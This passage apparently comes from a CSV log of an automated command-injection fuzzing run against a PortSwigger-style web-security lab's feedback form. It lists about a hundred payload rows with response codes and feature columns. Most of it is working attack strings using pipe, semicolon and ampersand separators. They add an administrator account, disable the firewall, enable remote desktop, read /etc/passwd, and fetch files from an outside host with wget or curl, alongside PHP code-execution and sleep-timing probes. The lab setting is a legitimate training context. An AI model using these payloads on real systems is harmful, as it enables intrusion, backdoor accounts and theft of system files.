",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,201,"
echo INJECTX
exit
\033[2Asleep 5
",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,202,"
echo INJECTX
exit
\033[2Awget https://crowdshield.com/.testing/rce_vuln.txt
",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,203,| net localgroup Administrators hacker /ADD,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,204,; net localgroup Administrators hacker /ADD,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,205,& net localgroup Administrators hacker /ADD,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,206,&& net localgroup Administrators hacker /ADD,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,207,net localgroup Administrators hacker /ADD,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,208,| netsh firewall set opmode disable,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,209,; netsh firewall set opmode disable,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,210,& netsh firewall set opmode disable,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,211,&& netsh firewall set opmode disable,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,212,netsh firewall set opmode disable,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,213,netstat,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,214,;netstat -a;,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,215,| netstat -an,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,216,; netstat -an,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,217,& netstat -an,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,218,&& netstat -an,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,219,netstat -an,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,220,| net user hacker Password1 /ADD,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,221,; net user hacker Password1 /ADD,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,222,& net user hacker Password1 /ADD,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,223,&& net user hacker Password1 /ADD,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,224,net user hacker Password1 /ADD,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,225,| net view,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,226,; net view,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,227,& net view,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,228,&& net view,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,229,net view,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,230,"
id|",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,231,"
id;",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,232,"
id
",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,233,"
/usr/bin/id
",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,234,"perl -e 'print ""X""x1024'",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,235,"|| perl -e 'print ""X""x16096'",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,236,"| perl -e 'print ""X""x16096'",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,237,"; perl -e 'print ""X""x16096'",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,238,"& perl -e 'print ""X""x16096'",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,239,"&& perl -e 'print ""X""x16096'",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,240,"perl -e 'print ""X""x16384'",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,241,"; perl -e 'print ""X""x2048'",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,242,"& perl -e 'print ""X""x2048'",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,243,"&& perl -e 'print ""X""x2048'",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,244,"perl -e 'print ""X""x2048'",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,245,"|| perl -e 'print ""X""x4096'",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,246,"| perl -e 'print ""X""x4096'",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,247,"; perl -e 'print ""X""x4096'",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,248,"& perl -e 'print ""X""x4096'",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,249,"&& perl -e 'print ""X""x4096'",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,250,"perl -e 'print ""X""x4096'",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,251,"|| perl -e 'print ""X""x8096'",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,252,"| perl -e 'print ""X""x8096'",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,253,"; perl -e 'print ""X""x8096'",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,254,"&& perl -e 'print ""X""x8096'",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,255,"perl -e 'print ""X""x8192'",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,256,"perl -e 'print ""X""x81920'",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,257,|| phpinfo(),https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,258,| phpinfo(),https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,259, {${phpinfo()}},https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,260,;phpinfo(),https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,261,;phpinfo();//,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,262,';phpinfo();//,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,263,{${phpinfo()}},https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,264,& phpinfo(),https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,265,&& phpinfo(),https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,266,phpinfo(),https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,267,phpinfo();,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,268,"<?php system(""cat /etc/passwd"");?>",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,269,"<?php system(""curl https://crowdshield.com/.testing/rce_vuln.txt?method=phpsystem_get"");?>",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,270,"<?php system(""curl https://crowdshield.com/.testing/rce_vuln.txt?req=df2fkjj"");?>",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,271,"<?php system(""echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"");?>",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,272,"<?php system(""sleep 10"");?>",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,273,"<?php system(""sleep 5"");?>",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,274,"<?php system(""wget https://crowdshield.com/.testing/rce_vuln.txt?method=phpsystem_get"");?>",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,275,"<?php system(""wget https://crowdshield.com/.testing/rce_vuln.txt?req=jdfj2jc"");?>",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,276,:phpversion();,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,277,`ping 127.0.0.1`,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,278,& ping -i 30 127.0.0.1 &,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,279,& ping -n 30 127.0.0.1 &,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,280,;${@print(md5(RCEVulnerable))};,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,281,"${@print(""RCEVulnerable"")}",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,282,${@print(system($_SERVER['HTTP_USER_AGENT']))},https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,283,pwd,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,284,| pwd,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,285,; pwd,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,286,& pwd,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,287,&& pwd,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,288,"",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,289,"| reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,290,"; reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,291,"& reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,292,"&& reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,293,"reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,294,"
",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,295,route,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,296,| sleep 1,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,297,; sleep 1,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,298,& sleep 1,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,299,&& sleep 1,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,300,sleep 1,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,301,|| sleep 10,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,302,| sleep 10,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,303,; sleep 10,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,304,{${sleep(10)}},https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,305,& sleep 10 ,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,306,&& sleep 10,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,307,sleep 10,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
